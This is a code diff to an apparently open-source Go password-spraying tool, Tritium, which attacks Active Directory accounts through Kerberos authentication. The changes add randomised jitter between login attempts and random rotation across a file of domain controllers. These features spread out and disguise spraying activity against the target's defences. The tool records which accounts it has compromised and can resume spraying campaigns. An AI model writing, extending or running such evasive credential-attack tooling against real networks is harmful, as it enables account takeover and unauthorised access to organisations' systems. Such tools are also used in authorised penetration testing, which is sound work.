@@ -17,7 +17,7 @@
   Free Software Foundation, 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 
   Contact Information:
- 
+
   Ali S. Ahmad (s4r1n97@gmail.com)
 
 */
@@ -31,6 +31,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"os"
 	"strings"
 	"time"
@@ -56,6 +57,7 @@ const (
 
  -d            The full domain to use (-domain targetdomain.local)
  -dc           Domain controller to authenticate against (-dc washingtondc.targetdomain.local)
+ -dcf          File of domain controllers to authenticate against 
  -u            Select single user to authenticate as (-user jsmith) 
  -uf           User file to use for password spraying (-userfile ~/home/users.txt)
  -p            Password to use for spraying (-password Welcome1)
@@ -64,9 +66,10 @@ const (
 
  -help         Print this help menu
  -o            Tritium Output file (default spray.json)
- -w            Wait time between authentication attempts [Default 1] (-w 0)          
- -rs           Enable recursive spraying [Default 3600] (-ws 1800)
- -ws           Wait time between sprays 
+ -w            Wait time between authentication attempts [Default 1] (-w 0)    
+ -jitter       % Jitter between authentication attempts      
+ -rs           Enable recursive spraying 
+ -ws           Wait time between sprays [Default 3600] (-ws 1800)
  -pwf          Password file to use for recursive 
  -res          Continue a password spraying campaign
  -rf           Tritium Json file 
@@ -89,7 +92,9 @@ type FlagOptions struct { // option var decleration
 	domain           string
 	password         string
 	domainController string
+	dcf              string
 	wait             int
+	jitter           int
 	o                string
 
 	rs  bool
@@ -105,10 +110,12 @@ func options() *FlagOptions {
 	userfile := flag.String("uf", "", "userfile for spraying")
 	domain := flag.String("d", "", "userdomain")
 	password := flag.String("p", "", "password for spraying")
-	domainController := flag.String("dc", "", "password for spraying")
+	domainController := flag.String("dc", "", "KDC to authenticate against")
+	dcf := flag.String("dcf", "", "File of KDCs to Auth Against")
 
 	help := flag.Bool("h", false, "Help Menu")
 	wait := flag.Int("w", 1, "Wait time between authentication attempts")
+	jitter := flag.Int("jitter", 0, "Jitter between auth attempts")
 	rs := flag.Bool("rs", false, "Recursive Spray flag")
 	ws := flag.Int("ws", 3600, "Wait time between sprays")
 	pwf := flag.String("pwf", "", "Password file")
@@ -117,15 +124,37 @@ func options() *FlagOptions {
 	o := flag.String("o", "spray.json", "outfile")
 
 	flag.Parse()
-	return &FlagOptions{help: *help, username: *username, userfile: *userfile, domain: *domain, password: *password, domainController: *domainController, wait: *wait, rs: *rs, ws: *ws, pwf: *pwf, rf: *rf, res: *res, o: *o}
+	return &FlagOptions{help: *help, username: *username, userfile: *userfile, domain: *domain, password: *password, domainController: *domainController, wait: *wait, rs: *rs, ws: *ws, pwf: *pwf, rf: *rf, res: *res, o: *o, jitter: *jitter, dcf: *dcf}
 }
-func wait(wt int) {
-	waitTime := time.Duration(wt) * time.Second
-	time.Sleep(waitTime)
+func wait(wt int, jitPerc int) {
+	var jitter float64 = 0
+	var wait int = 0
+	var sign int = rand.Intn(2)
+	if sign == 0 {
+		sign = 1
+	} else {
+		sign = -1
+	}
+	if jitPerc > 0 {
+		jitter = float64(rand.Intn(jitPerc)*sign) / 100 // creates jitter percentage
+	} else {
+		jitter = 0.0
+	}
+	var jitWait float64 = float64(wt*1000) * jitter // creates jitter time (plus or minus whatever seconds)
+	wait = (wt * 1000) + int(jitWait)               // actual wait time
+	time.Sleep(time.Duration(wait) * time.Millisecond)
 }
 
 type Authenticator interface {
 	Login() (string, string, error)
+}
+
+func randomDC(dcs []string) string {
+	var dc string
+	if len(dcs) > 0 {
+		dc = dcs[rand.Intn(len(dcs))]
+	}
+	return dc
 }
 
 type account struct {
@@ -157,7 +186,7 @@ func kerbAuth(username string, relm string, pass string, domainController string
 
 	/*
 		Formats the config per the RFC standard
-	 */
+	*/
 	kcfg_str := fmt.Sprintf(KERB_FMT_STRING, domain, DC)
 
 	cfg, err := kconfig.NewConfigFromString(kcfg_str)
@@ -166,7 +195,7 @@ func kerbAuth(username string, relm string, pass string, domainController string
 	err = cl.Login()
 
 	if err != nil {
-		if strings.Contains(err.Error(), "Networking_Error: AS Exchange Error"){
+		if strings.Contains(err.Error(), "Networking_Error: AS Exchange Error") {
 			fmt.Println("[Fatal: Networking Error - Cannot contact KDC]")
 			os.Exit(1)
 		} else if strings.Contains(err.Error(), "KRB_AP_ERR_SKEW") {
@@ -174,19 +203,19 @@ func kerbAuth(username string, relm string, pass string, domainController string
 			os.Exit(1)
 
 		} else if strings.Contains(err.Error(), "KRB5_REALM_UNKNOWN") {
-			
+
 			fmt.Println("Cannot find KDC for requested realm")
 			os.Exit(1)
-			
+
 		} else if strings.Contains(err.Error(), "KRB5_KDC_UNREACH") {
-			
+
 			fmt.Println("Cannot contact any KDC for requested realm")
 			os.Exit(1)
-			
+
 		} else if strings.Contains(err.Error(), "client does not have a username") {
-			
+
 			retString += "\t [Blank Username]"
-		
+
 		} else if strings.Contains(err.Error(), "KDC_ERR_CLIENT_REVOKED") {
 
 			retString += "\t [USER ACCOUNT LOCKED]"
@@ -224,7 +253,7 @@ func linecounter(fileName string) int {
 
 }
 
-func genericSpray(uf string, realm string, password string, domaincontroller string, wt int, of string) {
+func genericSpray(uf string, realm string, password string, DCs []string, wt int, of string, jitter int) {
 
 	var counter int = 0
 	var lockoutProtection int = 0       // if reaches 3 consecetive lockouts exit program
@@ -258,7 +287,7 @@ func genericSpray(uf string, realm string, password string, domaincontroller str
 		if users[counter].Compromised == false {
 			// if false
 			users[counter].Password = password
-			matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, domaincontroller)
+			matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, randomDC(DCs))
 			if strings.Contains(matcher, "[VALID Login!]") {
 				users[counter].Compromised = true
 			}
@@ -277,14 +306,14 @@ func genericSpray(uf string, realm string, password string, domaincontroller str
 				break
 			}
 
-			wait(wt)
+			wait(wt, jitter)
 		}
 		counter++
 	}
 	saveState(users, of)
 }
 
-func recursiveSpray(uf string, realm string, pwf string, dc string, wt int, ws int, of string) {
+func recursiveSpray(uf string, realm string, pwf string, DCs []string, wt int, ws int, of string, jitter int) {
 	var counter int = 0
 	var pNum int = 0
 	var lockoutProtection int = 0 // if reaches 3 consecetive lockouts exit program
@@ -334,7 +363,7 @@ func recursiveSpray(uf string, realm string, pwf string, dc string, wt int, ws i
 			if users[counter].Compromised == false {
 				users[counter].Password = pwscanner.Text() // sets new password value for object if object isnt compromised
 
-				matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, dc)
+				matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, randomDC(DCs))
 				if strings.Contains(matcher, "[VALID Login!]") {
 					users[counter].Compromised = true
 				}
@@ -354,17 +383,17 @@ func recursiveSpray(uf string, realm string, pwf string, dc string, wt int, ws i
 					saveState(users, of)
 					os.Exit(1)
 				}
-				wait(wt)
+				wait(wt, jitter)
 			}
 
 		}
 		saveState(users, of)
 		pNum++
-		wait(ws)
+		wait(ws, 0)
 	}
 
 }
-func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, dc string, of string) {
+func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, DCs []string, of string, jitter int) {
 
 	var lockoutProtection int = 0 // if reaches 3 consecetive lockouts exit program
 	var matcher string            // used to see if result of auth = account lockout
@@ -399,7 +428,7 @@ func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, dc st
 
 					users[i].Password = pwscanner.Text() // sets new password value for object if object isnt compromised
 
-					matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, dc)
+					matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
 					if strings.Contains(matcher, "[VALID Login!]") {
 						users[i].Compromised = true
 					}
@@ -421,11 +450,11 @@ func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, dc st
 					}
 
 				}
-				wait(wt)
+				wait(wt, jitter)
 			}
 			saveState(users, of)
 			passNum++
-			wait(ws)
+			wait(ws, 0)
 
 		}
 
@@ -434,7 +463,7 @@ func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, dc st
 		for i := 0; i < len(users); i++ {
 			if users[i].Compromised == false {
 				users[i].Password = pwstring
-				matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, dc)
+				matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
 				if strings.Contains(matcher, "[VALID Login!]") {
 					users[i].Compromised = true
 				}
@@ -454,7 +483,7 @@ func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, dc st
 					saveState(users, of)
 					os.Exit(1)
 				}
-				wait(wt)
+				wait(wt, jitter)
 			}
 
 		}
@@ -467,6 +496,9 @@ func main() {
 
 	var err bool = false
 	var rs bool = false
+	var dcARR []string
+
+	rand.Seed(time.Now().UnixNano())
 
 	fmt.Println(banner)
 	opt := options()
@@ -476,22 +508,37 @@ func main() {
 		fmt.Println(usage)
 		os.Exit(0)
 	}
+
+	if opt.domainController == "" && opt.dcf == "" {
+		fmt.Println("Error I need a KDC or a KDC file")
+		os.Exit(1)
+	} else if opt.dcf != "" {
+		dcList, err := os.Open(opt.dcf)
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer dcList.Close()
+		dcs := bufio.NewScanner(dcList)
+		for dcs.Scan() {
+			dcARR = append(dcARR, dcs.Text())
+		}
+	} else {
+
+		dcARR = append(dcARR, opt.domainController)
+
+	}
+
 	if opt.res {
 		if opt.rf != "" {
 			if opt.rs {
-				if opt.domainController == "" {
-					fmt.Println("[+] Domain Controller Not Provided")
-					os.Exit(1)
-				} else {
-					resumeSpray(opt.rf, opt.pwf, opt.rs, opt.wait, opt.ws, opt.domainController, opt.o) // recursive spray
-				}
+
+				resumeSpray(opt.rf, opt.pwf, opt.rs, opt.wait, opt.ws, dcARR, opt.o, opt.jitter) // recursive spray
+
 			} else {
-				if opt.domainController == "" {
-					fmt.Println("[+] Domain Controller Not Provided")
-				} else {
-					resumeSpray(opt.rf, opt.password, opt.rs, opt.wait, opt.ws, opt.domainController, opt.o) // generic spray
-					os.Exit(1)
-				}
+
+				resumeSpray(opt.rf, opt.password, opt.rs, opt.wait, opt.ws, dcARR, opt.o, opt.jitter) // generic spray
+				os.Exit(1)
+
 			}
 
 		} else {
@@ -512,10 +559,6 @@ func main() {
 		}
 		if opt.password == "" && opt.rs == false {
 			fmt.Println("[+] Password Not Provided")
-			err = true
-		}
-		if opt.domainController == "" {
-			fmt.Println("[+] Domain Controller Not Provided")
 			err = true
 		}
 		if err {
@@ -540,12 +583,12 @@ func main() {
 					os.Exit(1)
 
 				}
-				genericSpray(opt.userfile, opt.domain, opt.password, opt.domainController, opt.wait, opt.o)
+				genericSpray(opt.userfile, opt.domain, opt.password, dcARR, opt.wait, opt.o, opt.jitter)
 
 			} else {
 				if opt.pwf != "" {
 
-					recursiveSpray(opt.userfile, opt.domain, opt.pwf, opt.domainController, opt.wait, opt.ws, opt.o)
+					recursiveSpray(opt.userfile, opt.domain, opt.pwf, dcARR, opt.wait, opt.ws, opt.o, opt.jitter)
 
 				} else {
 
